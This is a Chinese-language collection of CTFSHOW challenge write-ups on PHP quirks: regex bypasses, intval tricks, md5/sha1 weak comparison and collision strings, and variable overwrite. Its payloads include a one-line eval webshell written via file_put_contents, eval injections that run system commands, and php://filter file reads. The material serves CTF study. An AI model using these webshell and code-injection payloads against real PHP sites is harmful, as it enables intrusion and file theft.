## 前言

这篇文章是对自己积累的`php特性`总结一下,根据CTFSHOW提供的代码

##  1.数组绕过正则表达式--绕preg_match

### web89

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

```
preg_match
返回值
返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。
```

正则表达式，遇到一个数组，而不是一个字符串的话，就会返回false，从而绕过。

```
payload:num[]=1
```

##  2.正则表达式修饰符--绕preg_match

###  web91

```php
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

拓展

```php
i 
不区分(ignore)大小写

m
多(more)行匹配
若存在换行\n并且有开始^或结束$符的情况下，
将以换行为分隔符，逐行进行匹配
$str = "abc\nabc";
$preg = "/^abc$/m";
preg_match($preg, $str,$matchs);
这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。
s
特殊字符圆点 . 中包含换行符
默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符
$str = "abggab\nacbs";
$preg = "/b./s";
preg_match_all($preg, $str,$matchs);
这样匹配到的有三个 bg b\n bs
A
强制从目标字符串开头匹配;
D
如果使用$限制结尾字符,则不允许结尾有换行; 
e
配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 
```

```
payload：%0aphp       %0a是换行符
```

```
%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。
经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag
```

###  利用回溯最大次数绕过正则表达式

```
preg_match(搜索的模式，输入字符串)
返回值
preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第
一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果
发生错误preg_match()返回 false。
```

```
原理：
PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false，就自动绕过了正则表达式。
```

```php
if(isset($_POST['f'])){
    $f = $_POST['f'];
    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
} 
```

python脚本

```python
import requests
url="url"
data={
	'f':'very'*250000+'ctfshow'
}
r=requests.post(url,data=data)
print(r.text)
```

参考文献：
https://www.freebuf.com/articles/web/190794.html

##  3.ereg %00正则截断

###  web108

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
?>
```

考点：ereg %00正则截断

首先解析正则表达式

```php
^[a-zA-Z]+$,表示匹配除了所有的字母的所有字符，并且匹配一次或者多次
```

ereg函数，在匹配到后，会返回false

正则表达式在遇到%00截断后，只会匹配%00前的东西

payload

```
strrev：使字符串反转
intval：将变量值整数化
36d的十进制为877
c=a%00778
```

##  4.intval

官方文档
参数

```php
intval ( mixed $var [, int $base = 10 ] ) : int
其中，var为要转换的数量值
base为转换所用的进制
Note:
如果 base 是 0，通过检测 var 的格式来决定使用的进制：
如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
将使用 10 进制 (decimal)。
```

返回值

```
成功时返回 value 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。

最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上，intval('1000000000000') 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。

字符串有可能返回 0，虽然取决于字符串最左侧的字符。 使用 整型转换 的共同规则。
```

例子

```php
<?php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34
echo intval('042');                   // 42
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
echo intval(false);                   // 0
echo intval(true);                    // 1
?>
```

###  web90，92，93，94，95

payload

```php
intval('4476a')===4476     字符串
如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。
如果字符串第一个是‘-’，则从第二个开始算起
intval('4476.0')===4476    小数点  
intval('+4476.0')===4476   正负号
intval('4476e0')===4476    科学计数法
函数如果base为0 则 base为0则base为0则var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中表示科学计数法
intval('0x117c')===4476    16进制
intval('010574')===4476    8进制
intval(' 010574')===4476   8进制+空格
```

补充函数：

```php
is_numeric(value),value为需要检测的字符串
作用是，如果value为数字或者数字字符串，返回true，否则返回false
相关函数
ctype_digit() - 做纯数字检测
is_bool() - 检测变量是否是布尔值
is_null() - 检测变量是否为 null
is_float() - 检测变量是否是浮点型
is_int() - 检测变量是否是整数
is_string() - 检测变量是否是字符串
is_object() - 检测变量是否是一个对象
is_array() - 检测变量是否是数组

```

## 5.trim函数的绕过+is_numeric的绕过

### web115

代码

```php
<?
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}

```

需要绕过is_numeric和trim和filter函数自定义	

```
trim函数介绍
语法
trim(string,charlist)

参数	描述
string	        必需。规定要检查的字符串。
charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：

"\0"       - NULL
"\t"       - 制表符
"\n"       - 换行
"\x0B"     - 垂直制表符
"\r"       - 回车
" "        - 空格

is_numeric函数介绍:
is_numeric — 检测变量是否为数字或数字字符串

说明
is_numeric(mixed $value): bool
检测指定的变量是否为数字或数字字符串。

参数
value
需要检测的变量。

返回值
如果 value 是数字或数字字符串， 返回 true；否则返回 false。
```

做个测试

验证is_numeric()

```php
for ($i=0; $i <128 ; $i++) { 
    $x=chr($i).'1';
   if(is_numeric($x)==true){
        echo urlencode(chr($i))."\n";
   }
}
输出：%09 %0A %0B %0C %0D %20 %2B + - .
```

验证trim函数

```php
<?php
for ($i=0; $i <=128 ; $i++) {
    $x=chr($i).'1';
    if(trim($x)!=='1' &&  is_numeric($x)){
        echo urlencode(chr($i))."\n";
    }
}
输出：%0c + - .
```

然后因为filter函数

payload

```
num=%0c36,%0c需要放在最前面
```

##  6.路径问题

### web96 

```php
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

函数

```php
highlight_file(filename,return):对文件进行语法高亮显示
filename	必需。要进行高亮处理的 PHP 文件的路径。
return	可选。如果设置 true，则本函数返回高亮处理的代码。
本函数通过使用 PHP 语法高亮程序中定义的颜色，输出或返回包含在 filename 中的代码的语法高亮版本。

许多服务器被配置为对带有 phps 后缀的文件进行自动高亮处理。例如，在查看 
example.phps 时，将显示该文件被语法高亮显示的源代码。要启用该功能，请把下面这一行添加到 httpd.conf：

AddType application/x-httpd-php-source .phps
show_source():跟上面一样的
```

意思就是，可以利用show_source来显示出代码内容。

payload：

```php
u=/var/www/html/flag.php   		绝对路径
u=./flag.php									相对路径
u=php://filter/resource=flag.php	php伪协议
u=php://filter/read=convert.base64-encode/resource=flag.php
```

## 7.md5绕过

###  强类型比较

```php
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
```

md5不能识别数组，都会返回Null值。
此时两个md5后的值采用严格比较，没有规定字符串如果这个时候传入的是数组不是字符串，可以利用md5()函数的缺陷进行绕过
payload

```php
a[]=1&b[]=2
```

###  弱类型比较

```php
if(md5($_GET['a'])==md5($_GET['b']))
echo $flag;
```

只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较（即==)时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等
参考payload：

```
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361
```

其他的参考：https://github.com/spaze/hashes/blob/master/md5.md

###  md5碰撞

```php
if($_GET['a']!==$_GET['b'] && md5($_GET['a'])===md5($_GET['b']))
{
	echo flag.php;
}
```

真实md5碰撞，不能使用数组，只能找相同md5值的字符串

```
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

参考网站：
https://www.jianshu.com/p/c9089fd5b1ba

###  第四种情况

```php
$query = "SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"],true) . "'";
```

这需要一个极其特殊的md5的值 ffifdyop

这个字符串进行md5后恰好结果是’or’6�]��!r,��b，他的前四位为’or’正好满足sql注入查询的条件，因此可以完美绕

###  其他的hash值(md4,CRC32)

https://github.com/spaze/hashes

##  8.sha1的绕过

###  web104，106

```php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
} 
```

利用了sha1弱类型比较，跟MD5加密是一样的

利用数组绕过或者弱类型绕过

payload

```
GET:v2[]=1
POST:v1[]=2
还有一些字符串
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
```

如果是强类型转换

```php
if(sha1($v1)===sha1($v2) && $v1!=$v2){
        echo $flag;
    }
使用数组绕过，v1[]=1&v2[]=2
```

但是还有一种，直接把数组过滤了

```php
if(is_array($_GET['name']) || is_array($_GET['password']))
        die('There is no way you can sneak me, young man!');
 else if (sha1($_GET['name']) === sha1($_GET['password']))
      	echo $flag;
```

我们不能用数组了

还有一种payload

sha1碰撞

```
name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
&password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 
```

##  9.三目运算符+变量覆盖

```php
(expr1)?(expr2):(expr3); //表达式1?表达式2:表达式3

如果条件“expr1”成立，则执行语句“expr2”，否则执行“expr3”。
```

###  web98

```
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```

审计代码：
第一行代码，得知如果有get传入参数，将post的值赋值给get
第二行跟第三行没有用
第四行，如果get传了一个HTTP_FLAG=flag就输出flag否则显示index.php源码。
所以我们get随便传一个，然后post传 HTTP_FLAG=flag即可

payload：get：1=1（随便都可以） post：HTTP_FLAG=flag

##  10.变量覆盖

###  前言

```
	变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结
合程序的其它功能来实现完整的攻击。

　  经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数，
import_request_variables()使用不当，开启了全局变量注册等
```

### $$使用不当

$key='text'; $$key =200  的意思是  将 $key 的值作为变量  并赋值为 200

$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。

```php
<?php
  
$name=’thinking’;
 
foreach ($_GET as $key => $value)
 
    $$key = $value;
 
var_dump($key);
 
var_dump($value);
 
var_dump($$key);
 
echo $name;
 
?>
 
//?name=test
//output:string(4) “name” string(4) “test” string(4) “test” test
```

###  foreach语句

函数foreach的分析(官方文档)

```php
foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试
应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：

foreach (iterable_expression as $value)
    statement
foreach (iterable_expression as $key => $value)
    statement
第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。

第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。

当二维及多维数组时，一般可以用list解嵌套的数组
<?php
$array = [
    [1, 2],
    [3, 4],
];

foreach ($array as list($a, $b, $c)) {
    echo "A: $a; B: $b; C: $c\n";
}
?>
```

例子一

```php
<?php
 
include “flag.php”;
 
$_403 = “Access Denied”;
 
$_200 = “Welcome Admin”;
 
if ($_SERVER["REQUEST_METHOD"] != “POST”)
 
    die(“BugsBunnyCTF is here :p…”);
 
if ( !isset($_POST["flag"]) )
 
    die($_403);
 
foreach ($_GET as $key => $value)
 
    $$key = $$value;
foreach ($_POST as $key => $value)
 
    $$key = $value;
 
if ( $_POST["flag"] !== $flag )
 
    die($_403);
 
15.echo “This is your flag : “. $flag . “\n”;
 
16.die($_200);
 
17.?>
```

几个函数

```php
isset():查找是否存在，如果存在的话，就返回true，不存在就是false
empty():不存在的话就是true，存在，非0非空就是false
die():退出脚本，并返回一个括号中的信息
exit():退出脚本，并返回一个括号中的信息
```

题目分析： 

源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了$$.两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 

但是由于第7，11-14行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。

解题方法： 

由于第7，11-14行间的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将$flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。

最终PAYLOAD： 

本地复现，所以flag与原题不一样

GET DATA：?_200=flag 

POST DATA：flag=aaaaaaaaaaaaaaaaaaaaa

####  web105

```php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
```

首先审计代码，先读懂$$key=$$value

```php
<?php
$a='hello';
$$a='world';
echo $a.${$a};
?>
输出helloworld
$$a,就等于变量$hello
```

如果GET输入a=b,$$key=$$value就是将$a=$b

通过die($error)出flag

GET中不能出现error，POST不能出现flag

payload

```
GET:a=flag
POST:error=a
```

通过die($suces)出flag

payload

```
GET:suces=flag&flag=NULL
POST:不输入东西，所以为NULL
```

###  extract()函数使用不当

```
extract(array,extract_rules,prefix)
```

用法：
extract() 函数从数组中将变量导入到当前的符号表。

该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。

第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。

该函数返回成功导入到符号表中的变量数目。
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204172145351.png)

```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";
?>
 
$a = Cat; $b = Dog; $c = Horse
```

一般考点：
当从GET或者POST得到参数后，-格式转换为数组，extract($_GET),当传入一个已有变量，就可以达到覆盖变量的目的。

###  parse_str()函数使用不当

parse_str() 函数把查询字符串解析到变量中。

注释：如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。

parse_str(string,array)
参数	描述
string	必需。规定要解析的字符串。
array	可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。

一般考点：当将字符串解析为数组变量时，键值对，会覆盖之前的变量，从而达到覆盖变量的目的

###  import_request_variables()使用不当

import_request_variables() 函数将 get／post／cookie 变量导入到全局作用域中。该函数在最新版本的 php 中已经不支持

import_request_variables() 函数将 get／post／cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。

```php
bool import_request_variables ( string $types [, string $prefix ] )
```

- $types：指定需要导入的变量，可以〖can〗用字母 g、p 和 c 分别表示 get、post 和 cookie，这些字母不区分大小写，所以你可以〖can〗使用 g 、 p 和 c 的任何组合。post 包含了通过 post 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，post 变量将使用相同的名字覆盖 get 变量。任何 gpc 以外的字母都将被忽略。

- $prefix： 变量名的前缀，置于所有〖all〗被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 get 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 e_notice 级别的错误。

##  11.parse_str的绕过

### web107

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
} 
```

考点parse_str

```php
官方文档：
parse_str — 将字符串解析成多个变量
parse_str(string $string, array &$result): void
如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。
参数
string:输入的字符串。
result:如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。
没有返回值。

代码显示：
<?php
$a='p=123&q=456';
parse_str($a,$b);
echo $b['p'];
echo $b['q'];
?>
输出123，456
```

payload

```
GET:v3=1
POST:v1=flag=c4ca4238a0b923820dcc509a6f75849b
```

##  12.对preg_replace的研究

官方文档

```php
 preg_replace(
    string|array $pattern,
    string|array $replacement,
    string|array $subject,
    int $limit = -1,
    int &$count = null
): string|array|null

参数说明
  $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
  $replacement: 用于替换的字符串或字符串数组。
  $subject: 要搜索替换的目标字符串或字符串数组。
  $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
  $count: 可选，为替换执行的次数。

返回值：
如果subject是一个数组，则返回一个数组，如果subject是一个字符串，则返回一个字符串。

作用：根据匹配规则，将subject中匹配到的字符替换给replacement

实例：删除空格符号
<?php
$str = 'runo o   b';
$str = preg_replace('/\s+/', '', $str);
// 将会改变为'runoob'
echo $str;
?>
```

但是，当pattern中有/e,就会出现preg_replace漏洞，第一个参数与第二个参数存在代码执行漏洞，只要当第一个参数等于/(.*)/e,那么第二个参数就可以php代码执行，且第三个参数可以是任意值。

两篇关于preg_replace函数的CTF题

```
https://www.cnblogs.com/-chenxs/p/11593878.html
https://blog.csdn.net/qq_43613772/article/details/108257958
```

参考文章

```
https://xz.aliyun.com/t/2557
https://www.cnblogs.com/dhsx/p/4991983.html
```

## 13.in_array的特性--php弱类型比较

###  web99

php代码

```php
<?
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
?> 
```

思路：看代码，array_push是将值加入到数组中，通过Get参数n参数一个值，使得该值在数组中。

payload：

```
n=1.php    post:content=<?php @eval($_POST[1]);?>
然后蚁剑连接。
```

知识点

```php
官方文档：https://www.php.net/manual/zh/function.in-array.php
in_array — 检查数组中是否存在某个值
in_array(mixed $needle, array $haystack, bool $strict = false): bool
参数
needle，待搜索的值。
注意:如果 needle 是字符串，则比较是区分大小写的。
haystack，待搜索的数组。
strict，如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。一般默认是false
返回值：
如果找到needle,则返回true，否则返回false
```

所以，当strict为false时，in_array就相当于==，不会比较类型，只比较值。

## 14.and与&&，or与||的区别--优先级  

```php
主要区别在优先级上面
<?php
$t1=true and false;
$t2=true && false;
var_dump($t1,$t2);
?>
t1返回的是true，t2返回的是false
优先级：&&>=>and

or与||同理可得
```

反射类的知识
ReflectionClass():报告了一个类的有关信息。

```php
1.常量 Contants
2.属性 Property Names
3.方法 Method Names静态
4.属性 Static Properties
5.命名空间 Namespace
6.Person类是否为final或者abstract
7.Person类是否有某个方法
8.获取注释：getDocComment
<?php
class A{
public static $flag="flag{123123123}";
const  PI=3.14;
static function hello(){
    echo "hello</br>";
}
}
$a=new ReflectionClass('A');

var_dump($a->getConstants());  获取一组常量
输出
 array(1) {
  ["PI"]=>
  float(3.14)
}

var_dump($a->getName());    获取类名
输出
string(1) "A"

var_dump($a->getStaticProperties()); 获取静态属性
输出
array(1) {
  ["flag"]=>
  string(15) "flag{123123123}"
}

var_dump($a->getMethods()); 获取类中的方法
输出
array(1) {
  [0]=>
  object(ReflectionMethod)#2 (2) {
    ["name"]=>
    string(5) "hello"
    ["class"]=>
    string(1) "A"
  }
}
```

ReflectionMethod()

```php
1.是否“public”、“protected”、“private” 、“static”类型
2.方法的参数列表
3.方法的参数个数
4.反调用类的方法
复制代码代码如下:
// 执行detail方法
$method = new ReflectionMethod('Person', 'test');
if ($method->isPublic() && !$method->isStatic()) {
 echo 'Action is right';
}
echo $method->getNumberOfParameters(); // 参数个数
echo $method->getParameters(); // 参数对象数组
```

##  15.&&与||的优先级



###  web132

先/robots.txt,再/admin

代码

```php
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
} 
```

mt_rand是生成随机数

看个例子

```php
<?php
if(false && false || true){   //也就是(flase || true)
    echo 667;
}
//输出结果：667
```

所以，我们只需要满足username=admin，就可以绕过第一个if

第二个if，满足code=admin

payload

```
?username=admin&code=admin&password=1
```

##  16.call_user_func()和call_user_func_array()

```
官方文档
call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数 call_user_func_array(callable $callback, array $param_arr): mixed
把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入
返回值：
返回回调函数的结果。如果出错的话就返回false 

call_user_func():把第一个参数作为回调函数调用
 call_user_func(callable $callback, mixed $parameter = ?, mixed $... = ?): mixed
 第一个参数是回调函数，后面的参数都是代入参数
 返回值：
 返回回调函数的返回值。 
```

回调函数可以传数组，表示传入的某个类或者命名空间的类。

###  web102，103

```php
<?php
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
参考：https://blog.csdn.net/miuzzx/article/details/109168454?spm=1001.2014.3001.5501
```

思路：首先v3=1.php，v1要为一个函数，v2要为数字。可以使用php://filter伪协议
关于php://filter的说明

```
参考：https://blog.csdn.net/qq_35544379/article/details/78230629
可以通过php伪协议绕过死亡exit
```

###  参考文章：

https://www.cnblogs.com/xiaozi/p/7768580.html

##  17.反射类--ReflectionClass的使用

###  web100，101

```php
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }  
}
?>
```

思路：只需要满足v1是数字，v2不含有；v3含有；
payload

```
v1=1&v2=echo new ReflectionClass&v3=;
```

非预期解1

```
v1=1&v2=var_dump($ctfshow)/*&v3=*/;
为什么要用/**/，因为var_dump是php执行代码，需要把后面v3注释，免得报错
```

非预期解2

```
v1=1&v2=?><?php eval($_POST[1]);?>/*&v3=*/;
v2最前面的?>是用来闭合php代码
```

知识点
三种注释方式

```
1.//是单行注释，有java，c，php
2.#也可以注释，有python，php
3./**/多行注释，有php，java
```

##  18.php异常类

###  web109

```php
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
```

羽师傅的wp：

先来看下这个正则表达式`/[a-zA-Z]+/` 匹配**至少有一个字母**的字符串
我们使用内置类让new不报错

payload

```
payload:
v1=Exception();system('tac f*');//&v2=a
v1=ReflectionClass&v2=system('tac f*')
```

##  19.php原生类

https://blog.csdn.net/unexpectedthing/article/details/121780909

##  20.FilesystemIterator类的使用

###  web110

代码显示

```php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");
```

考点：FilesystemIterator class

```php
在php中使用FilesystemIterator迭代器来遍历文件目录
<?php
$a=new FilesystemIterator('.');//定义一个对象
while($a->valid()){//判断文件指针是否到底了
    echo $a->getFilename().PHP_EOL;//得到文件名字
    $a->next();//指针移到下一位
}
?>
参考：https://www.php.net/manual/zh/class.filesystemiterator.php
就只需要调用对象的方法，就可以获得一些文件目录，文件创造的时间等
 
```

payload

```php
根据代码，我们首先新建一个FilesystemIterator类来查看文件目录结构
（）括号中需要传入文件路径，我们可以用.，./这些得到
 但是过滤了，所以使用getcwd方法来得到当前目录
?v1=FilesystemIterator&v2=getcwd得到文件路径
然后直接访问：
http://33ba02ae-bd26-41af-ae23-1d1162338f75.challenge.ctf.show:8080/fl36dga.txt
```



##  21.GLOBALS超全局变量

###  web111

```php
highlight_file(__FILE__);
